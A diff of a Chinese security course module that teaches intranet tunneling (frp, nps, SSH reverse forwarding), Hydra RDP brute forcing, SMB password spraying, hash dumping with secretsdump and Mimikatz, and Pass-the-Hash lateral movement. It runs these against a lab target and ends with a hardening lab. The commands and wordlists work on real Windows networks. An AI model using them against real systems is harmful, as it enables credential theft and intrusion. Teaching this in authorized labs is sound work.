+1. 浏览器访问 `http://<CVM公网IP>:8080`，登录 admin/admin123
+2. 客户端 → 新增 → 备注名 `Win11-phpStudy`，验证密钥 `npstest2025` → 保存
+3. 点击 `Win11-phpStudy` 旁的"隧道"→ 新增 TCP 隧道：服务端端口 `10012`，目标 `127.0.0.1:80`
 
-**第四步：在 SRV02 上运行 nps 客户端**
+**第四步：在 Win11 上运行 nps 客户端**
 
 ```powershell
-# 在 SRV02 上下载并启动 npc
+# 在 Win11 上下载并启动 npc
 Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
 # 解压后运行：
-C:\npc\npc.exe -server=<ECS公网IP>:8024 -vkey=npstest2025
+C:\npc\npc.exe -server=<CVM公网IP>:8024 -vkey=npstest2025
 ```
 
 **第五步：验证**
 
 ```bash
-nmap -p 10001 <ECS公网IP>
-# 预期：10001/tcp open
+nmap -p 10012 <CVM公网IP>
+# 预期：10012/tcp open
 ```
 
-> 💡 **nps vs frp**：nps 有 Web 管理界面，操作直观；frp 性能更高、配置更灵活、社区更活跃。课堂以 frp 为主，nps 作为补充。
+浏览器访问 `http://<CVM公网IP>:10012`，预期显示 Win11 phpStudy 的响应式页面。
+
+> 💡 **nps vs frp**：nps 有 Web 管理界面，操作直观，适合课堂观察隧道状态；frp 性能更高、配置更灵活、社区更活跃。两个工具安排为独立实验，便于比较配置方式和管理体验。
 
 ---
 
@@ -644,10 +807,10 @@ nmap -p 10001 <ECS公网IP>
 
 ```
 1. 远程端口转发（-R）——最适合内网穿透：
-   SRV02 主动 SSH 连接到 ECS，将自己的端口暴露到 ECS 上
+   内网主机主动 SSH 连接到 CVM，将自己的端口暴露到 CVM 上
 
 2. 本地端口转发（-L）：
-   Kali 通过 SSH 连接到 ECS，将 ECS 可达的端口映射到本地
+   验证端通过 SSH 连接到 CVM，将 CVM 可达的端口映射到本地
 
 3. 动态端口转发（-D）：
    通过 SSH 创建 SOCKS5 代理
@@ -656,23 +819,23 @@ nmap -p 10001 <ECS公网IP>
 **远程端口转发（推荐）**：
 
 ```powershell
-# 在 SRV02 上执行：将本地 RDP 暴露到 ECS 的 13389 端口
-ssh -R 13389:127.0.0.1:3389 root@<ECS公网IP> -N -f
+# 在内网主机上执行：将本地 Web 暴露到 CVM 的 10022 端口
+ssh -R 10022:127.0.0.1:80 root@<CVM公网IP> -N -f
 ```
 
 ```bash
-# 在 Kali 上验证
-nmap -p 13389 <ECS公网IP>
-# 预期：13389/tcp open
+# 在验证环境中验证
+nmap -p 10022 <CVM公网IP>
+# 预期：10022/tcp open
 
-xfreerdp /v:<ECS公网IP> /port:13389 /u:administrator /p:'P@ssw0rd' /cert:ignore
+curl http://<CVM公网IP>:10022
 ```
 
 **动态端口转发（SOCKS5）**：
 
 ```bash
-# 在 Kali 上通过 ECS 创建 SOCKS5 代理
-ssh -D 1080 root@<ECS公网IP> -N -f
+# 在验证环境中通过 CVM 创建 SOCKS5 代理
+ssh -D 1080 root@<CVM公网IP> -N -f
 
 # proxychains 配置：socks5 127.0.0.1 1080
 proxychains curl http://127.0.0.1:10002
@@ -748,11 +911,11 @@ proxychains curl http://127.0.0.1:10002
 
 ## 🛠️ 实践操作
 
-### 实验7：Windows 内网信息收集（在 SRV02 上执行）
+### 实验7：Windows 内网信息收集（在 Win11 实验主机或授权靶机上执行）
 
 > **操作方式**：本实验同时提供图形界面和命令行两种方式。
 >
-> **实验背景**：假设你已经通过 frp 隧道获得了 SRV02 的远程桌面（RDP），现在需要了解这台机器和它所在的内网环境。
+> **实验背景**：假设你正在对本机 Win11 实验主机或教师提供的授权靶机做安全检查，现在需要了解这台机器和它所在的内网环境。
 
 **第一步：本机网络信息——"我在哪？"**
 
@@ -843,24 +1006,22 @@ net view \\<其他主机IP>
 
 ---
 
-### 实验8：Nmap 内网扫描（通过 frp 隧道从 Kali 执行）
+### 实验8：Nmap 内网扫描（通过 frp 隧道从验证环境执行）
 
 > ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用。
 >
-> **实验背景**：实验7 中 `arp -a` 和 `ipconfig` 已经告诉我们 SRV02 的网段和 IP。现在从攻击机（Kali）通过 frp 隧道远程扫描 SRV02，验证发现的信息并探测更多细节。
+> **实验背景**：实验7 中 `arp -a` 和 `ipconfig` 已经告诉我们 Win11 实验主机或授权靶机的网段和 IP。现在从验证环境通过 frp 隧道远程扫描目标，验证发现的信息并探测更多细节。
 
 **第一步：直接扫描 frp 映射端口（快速摸底）**
 
 ```bash
-# 不经过 SOCKS5，直接扫描 ECS 上的映射端口（速度快）
-nmap -sV -p 10001,10002,10003,10004 <ECS公网IP>
+# 不经过 SOCKS5，直接扫描 CVM 上的映射端口（速度快）
+nmap -sV -p 10002,10080 <CVM公网IP>
 
 # 预期输出：
 # PORT     STATE  SERVICE       VERSION
-# 10001/tcp open  ms-wbt-server Microsoft Terminal Services  ← RDP
-# 10002/tcp open  http          Microsoft IIS httpd 10.0     ← Web
-# 10003/tcp open  wsman                                  ← WinRM
-# 10004/tcp open  microsoft-ds  Windows SMB              ← SMB
+# 10002/tcp open  http          Apache/PHPStudy Web
+# 10080/tcp open  socks5        frp socks5 proxy
 ```
 
 > 💡 **这一步的意义**：通过 frp 映射端口直接扫，速度快、不需要 proxychains。可以快速确认哪些服务在运行、运行什么版本——为后续选择攻击工具提供依据。
@@ -868,24 +1029,20 @@ nmap -sV -p 10001,10002,10003,10004 <ECS公网IP>
 **第二步：通过 SOCKS5 代理扫描（完整端口扫描）**
 
 ```bash
-# 确认 proxychains 配置：socks5 <ECS公网IP> 10080
+# 确认 proxychains 配置：socks5 <CVM公网IP> 10080
 
-# 扫描 SRV02 的常用端口（SOCKS5 从 SRV02 本地发起，所以目标是 127.0.0.1）
-proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 127.0.0.1
+# 扫描目标主机的常用端口（SOCKS5 从 Win11 本地发起，所以目标是 127.0.0.1）
+proxychains nmap -sT -p 80,135,139,445,3389,5985 127.0.0.1
 
 # 预期输出：
 # PORT     STATE  SERVICE
 # 80/tcp   open   http
-# 135/tcp  open   msrpc
-# 139/tcp  open   netbios-ssn
-# 445/tcp  open   microsoft-ds
-# 3389/tcp open   ms-wbt-server
-# 5985/tcp open   wsman
+# 其他端口是否开放取决于 Win11 或授权靶机的服务状态
 ```
 
 > 💡 **SOCKS5 扫描 vs 直接扫映射端口**：
 > - **直接扫映射端口**：速度快，但只能扫已配置映射的端口
-> - **SOCKS5 + proxychains**：速度慢，但可以扫 SRV02 上的**所有端口**，包括未映射的
+> - **SOCKS5 + proxychains**：速度慢，但可以扫目标主机上的**所有端口**，包括未映射的
 > - 实际操作中，先快速扫映射端口摸底，再用 SOCKS5 补充扫描
 
 **第三步：SMB 漏洞检测与共享枚举**
@@ -968,10 +1125,10 @@ Pass-the-Hash 攻击：
 
 > ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 和 SMB 映射端口 10004 可用。
 
-**前置准备——在 SRV02 上创建弱口令账户**：
+**前置准备——在授权靶机上创建弱口令账户**：
 
 ```powershell
-# 在 SRV02 上以管理员身份运行
+# 在授权靶机上以管理员身份运行
 net user testuser P@ssw0rd /add
 net user admin123 123456 /add
 net localgroup administrators admin123 /add
@@ -983,28 +1140,41 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 **第一步：使用 Hydra 暴力破解 RDP**
 
 ```bash
-# 在 Kali 上创建字典
-cat > /tmp/users.txt << 'EOF'
+# 在验证环境中创建用户字典
+vim /tmp/users.txt
+```
+
+写入：
+
+```text
 administrator
 testuser
 admin123
-EOF
+```
 
-cat > /tmp/passwords.txt << 'EOF'
+```bash
+# 创建密码字典
+vim /tmp/passwords.txt
+```
+
+写入：
+
+```text
 123456
 password
 P@ssw0rd
 admin
 admin123
 qwerty
-EOF
+```
 
+```bash
 # 通过 frp 隧道暴力破解 RDP
-hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4
+hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<CVM公网IP> -s 10001 -t 4
 
 # 预期输出：
-# [3389][rdp] host: <ECS公网IP>   login: admin123   password: 123456
-# [3389][rdp] host: <ECS公网IP>   login: testuser   password: P@ssw0rd
+# [3389][rdp] host: <CVM公网IP>   login: admin123   password: 123456
+# [3389][rdp] host: <CVM公网IP>   login: testuser   password: P@ssw0rd
 ```
 
 > 💡 **攻击者视角**：找到了两个有效凭据——`admin123:123456` 和 `testuser:P@ssw0rd`。其中 `admin123` 是管理员，可以直接用于横向移动。
@@ -1014,13 +1184,13 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4
 ```bash
 # NetExec 比 Medusa 更适合 SMB 协议，输出信息更丰富
 # 验证 administrator 账户的密码列表
-nxc smb <ECS公网IP> --port 10004 -u administrator -p /tmp/passwords.txt
+nxc smb <CVM公网IP> --port 10004 -u administrator -p /tmp/passwords.txt
 
 # 预期输出（成功时显示 Pwn3d!）：
-# SMB  <ECS公网IP>:10004  SRV02  [+] administrator:P@ssw0rd (Pwn3d!)
+# SMB  <CVM公网IP>:10004  授权靶机  [+] administrator:P@ssw0rd (Pwn3d!)
 
 # 批量验证多个用户
-nxc smb <ECS公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
+nxc smb <CVM公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
 ```
 
 > 💡 **为什么用 nxc 而不是 Medusa？** NetExec 专为 Windows 协议设计，不仅能验证密码，还能直接远程执行命令（`-x "whoami"`）、导出哈希（`--sam`），是内网渗透的瑞士军刀。
@@ -1029,11 +1199,11 @@ nxc smb <ECS公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
 
 ### 实验10：Pass-the-Hash 横向移动
 
-> ⚠️ **前置条件**：已通过实验9获取 SRV02 的管理员凭据（`administrator:P@ssw0rd`）。
+> ⚠️ **前置条件**：已通过实验9获取授权靶机的管理员凭据（`administrator:P@ssw0rd`）。
 >
 > **攻击链位置**：弱口令破解 → 明文密码 → **获取哈希** → **PtH 横向移动**（本实验）
 
-**工具安装**（在 Kali 上执行）：
+**工具安装**（在验证环境中执行）：
 
 ```bash
 sudo apt update
@@ -1047,7 +1217,7 @@ which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
 
 ```bash
 # 方法一：通过 secretsdump 远程导出（推荐，最简单）
-# 通过 SOCKS5 代理连接 SRV02，导出所有本地用户的哈希
+# 通过 SOCKS5 代理连接授权靶机，导出所有本地用户的哈希
 proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
 
 # 预期输出（关键部分）：
@@ -1055,7 +1225,7 @@ proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
 #                  ↑ LM Hash（通常为空）                ↑ NTLM Hash（这就是我们需要的）
 
 # 方法二：通过 Evil-WinRM + Mimikatz（交互式，更直观）
-evil-winrm -i <ECS公网IP> -P 10003 -u administrator -p 'P@ssw0rd'
+evil-winrm -i <CVM公网IP> -P 10003 -u administrator -p 'P@ssw0rd'
 
 # 在 Evil-WinRM 会话中执行 Mimikatz
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
@@ -1072,16 +1242,16 @@ upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 
 ```bash
 # 方法一：NetExec 快速验证哈希（最快，一行命令）
-nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
+nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 # 预期：显示 [+] administrator:<HASH> (Pwn3d!) → 哈希有效
 
 # 方法二：NetExec 远程执行命令（验证 + 执行一步到位）
-nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
+nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
 # 预期：显示命令执行结果 NT AUTHORITY\SYSTEM
 
 # 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5，无文件落地）
 proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
-# 预期：获得 SRV02 的命令行 Shell
+# 预期：获得授权靶机的命令行 Shell
 
 # 方法四：Impacket psexec（SYSTEM 权限 Shell，走 SOCKS5）
 proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
@@ -1115,7 +1285,7 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 | Pass-the-Hash | 无需明文密码，直接用哈希完成认证 → 为什么"哈希泄露 = 密码泄露" |
 | 获取哈希 | `impacket-secretsdump`（远程导出）或 Mimikatz（本地提取） |
 | 横向移动工具 | nxc（快速验证）、wmiexec（隐蔽执行）、psexec（SYSTEM Shell）、evil-winrm（交互式） |
-| frp 的角色 | 将内网服务映射到公网，使 Kali 上的工具可以直接攻击内网主机 |
+| frp 的角色 | 将内网服务映射到公网，使验证环境中的工具可以访问内网主机 |
 
 ---
 
@@ -1171,12 +1341,12 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 
 ### 实验11：内网安全加固
 
-> 本实验在 SRV02 上实施安全加固措施，然后从 Kali 验证加固效果。
+> 本实验在 Win11 实验主机或授权靶机上实施安全加固措施，然后从验证环境验证加固效果。
 
 **第一步：启用 SMB 签名**
 
 ```powershell
-# 在 SRV02 上执行
+# 在 Win11 实验主机或授权靶机上执行
 
 # 通过注册表启用 SMB 签名
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
@@ -1205,7 +1375,7 @@ Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountNa
 **第三步：配置防火墙限制横向移动**
 
 ```powershell
-# 在 SRV02 上执行
+# 在 Win11 实验主机或授权靶机上执行
 
 # 启用防火墙
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
@@ -1255,8 +1425,8 @@ net share ADMIN$ /delete
 **第六步：验证加固效果**
 
 ```bash
-# 在 Kali 上验证
-nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
+# 在验证环境中验证
+nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 # 预期：STATUS_ACCESS_DENIED（Protected Users 生效）
 ```
 
@@ -1280,17 +1450,17 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 检查项 | 操作 | 通过标准 |
 | --- | --- | --- |
-| ECS 安全组 | 阿里云控制台 → 安全组 | 22/7000/7500/10000-20000 端口已放行 |
-| ECS SSH 连接 | `ssh root@<ECS公网IP>` | 可正常登录 |
+| CVM 安全组 | 腾讯云控制台 → 安全组 | 22/7000/7500/10000-20000 端口已放行 |
+| CVM 网页登录 | 腾讯云控制台 → 实例 → 登录 → WebShell | 可正常登录 |
 | frps 启动 | `ss -tlnp \| grep 7000` | 7000/7500 端口监听 |
-| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` | 显示管理面板 |
-| SRV02 虚拟机 | 本地 VMware 启动 Windows Server | 可登录，可 `ping <ECS公网IP>` |
-| frpc 连接 | SRV02 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
-| 隧道验证 | Kali 上 `nmap -p 10001,10002 <ECS公网IP>` | 端口 open |
-| Kali 工具 | `which nmap proxychains4 evil-winrm nxc` | 均存在 |
+| frp Dashboard | 浏览器访问 `http://<CVM公网IP>:7500` | 显示管理面板 |
+| Win11/phpStudy | 本机启动 phpStudy Apache | `http://127.0.0.1` 可访问响应式页面 |
+| frpc 连接 | Win11 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
+| 隧道验证 | 验证环境执行 `nmap -p 10002,10080 <CVM公网IP>` | 端口 open |
+| Linux 工具 | `which nmap proxychains4 evil-winrm nxc` | 扩展实验时命令可用 |
 | Impacket | `sudo apt install -y impacket-scripts python3-impacket netexec` | 命令可用 |
 
-> **实验结束后务必释放 ECS 实例，避免持续扣费。**
+> **实验结束后务必释放 CVM 实例，避免持续扣费。**
 
 ---
 
@@ -1300,17 +1470,17 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 操作 | 命令/方法 |
 | --- | --- |
-| 阿里云安全组 | ECS 控制台 → 安全组 → 添加入站规则 |
-| ECS SSH 连接 | `ssh root@<ECS公网IP>` |
+| 腾讯云安全组 | CVM 控制台 → 安全组 → 添加入站规则 |
+| CVM 网页登录 | 腾讯云控制台 → 实例 → 登录 → WebShell |
 | frps 前台启动 | `/opt/frp/frps -c /opt/frp/frps.toml` |
 | frps 注册服务 | `systemctl enable frps && systemctl start frps` |
 | frpc 前台启动 | `C:\frp\frpc.exe -c C:\frp\frpc.toml` |
 | frpc 注册服务 | NSSM：`nssm install frpc "C:\frp\frpc.exe" "-c" "C:\frp\frpc.toml"` |
-| frp Dashboard | `http://<ECS公网IP>:7500` |
-| SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<ECS公网IP> -N -f` |
+| frp Dashboard | `http://<CVM公网IP>:7500` |
+| SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<CVM公网IP> -N -f` |
 | proxychains | `proxychains nmap -sT -p 端口 127.0.0.1` |
-| RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<ECS公网IP> -s 10001` |
-| SMB 密码喷洒 | `nxc smb <ECS公网IP> --port 10004 -u 用户 -p 密码.txt` |
+| RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<CVM公网IP> -s 10001` |
+| SMB 密码喷洒 | `nxc smb <CVM公网IP> --port 10004 -u 用户 -p 密码.txt` |
 | 获取哈希 | `proxychains impacket-secretsdump administrator:'密码'@127.0.0.1` |
 | PtH 攻击 | `nxc smb <IP> --port 10004 -u admin -H '<HASH>'` 或 `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
 | SMB 签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
@@ -1321,12 +1491,12 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 问题 | 原因 | 解决方法 |
 | --- | --- | --- |
-| ECS 端口不通 | 安全组未放行 | 在控制台添加入站规则 |
-| frpc 连接失败 | Token 不一致/安全组未放行/SRV02 无法上网 | 逐项检查 |
+| CVM 端口不通 | 安全组未放行 | 在控制台添加入站规则 |
+| frpc 连接失败 | Token 不一致/安全组未放行/Win11 无法上网 | 逐项检查 |
 | 隧道已建立但无法访问服务 | 本地服务未启动或配置错误 | 确认服务运行，检查 frpc.toml |
 | proxychains 超时 | SOCKS5 隧道断开或配置错误 | 检查 frp SOCKS5 状态和 proxychains 配置 |
 | Hydra 超时 | frp 隧道延迟 | 增加 `-w 10`，降低 `-t 1` |
-| Evil-WinRM 失败 | WinRM 未启用 | SRV02 上执行 `Enable-PSRemoting -Force` |
+| Evil-WinRM 失败 | WinRM 未启用 | 授权靶机上执行 `Enable-PSRemoting -Force` |
 | Mimikatz 被拦截 | Windows Defender | 关闭实时防护（仅实验环境） |
 
 ---
@@ -1335,7 +1505,7 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 ### 攻防对抗思维
 
-> **核心理念**：内网安全的本质不是"建高墙"（边界防火墙），而是"建多层墙"（纵深防御）。本项目通过阿里云 ECS + frp 的真实内网穿透场景，展示了攻击者如何利用一条出站连接将整个内网暴露到公网。唯有实施网络分段、身份隔离、终端防护、监控检测等多层防御，才能有效限制攻击扩散。
+> **核心理念**：内网安全的本质不是"建高墙"（边界防火墙），而是"建多层墙"（纵深防御）。本项目通过腾讯云 CVM + frp 的真实内网穿透场景，展示了攻击者如何利用一条出站连接将指定内网服务暴露到公网。唯有实施网络分段、身份隔离、终端防护、监控检测等多层防御，才能有效限制攻击扩散。
 
 ### 企业环境防御最佳实践
 
@@ -1366,7 +1536,7 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 4. **纵深防御设计**：假设你是一家中小企业的网络安全管理员，请参考本项目所学内容，按优先级列出至少五项核心安全措施，并说明每项措施防御的攻击技术。
 
-5. **云安全**：本项目使用阿里云 ECS 作为穿透服务器。在真实场景中，攻击者也可能利用其他云服务（如 AWS、Azure）或免费的 CDN 服务作为中转。企业应如何应对这种"云上跳板"的攻击模式？
+5. **云安全**：本项目使用腾讯云 CVM 作为穿透服务器。在真实场景中，攻击者也可能利用其他云服务（如 AWS、Azure）或免费的 CDN 服务作为中转。企业应如何应对这种"云上跳板"的攻击模式？
 
 ---
 
@@ -1374,8 +1544,8 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 关联项目 | 关联内容 |
 | --- | --- |
-| **项目一·走进Windows服务器** | 网络环境配置是本项目的基础；本项目通过阿里云 ECS 部署 frp，深化网络穿透的理解 |
-| **项目四·IIS网站管理** | IIS Web 服务是内网穿透的映射目标；IIS 安全加固在内网中同样重要 |
+| **项目一·走进Windows服务器** | 网络环境配置是本项目的基础；本项目通过腾讯云 CVM 部署 frp，深化网络穿透的理解 |
+| **项目四·网站管理** | Web 服务是内网穿透的映射目标；本项目使用 phpStudy/Apache 做轻量化演示 |
 | **项目五·远程管理** | RDP 和 WinRM 是横向移动的主要通道——暴力破解和远程执行均依赖这些服务 |
 | **项目六·域管理** | 域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
 | **项目七·应用安全** | 后门持久化技术在横向移动后的"持久化"阶段使用 |
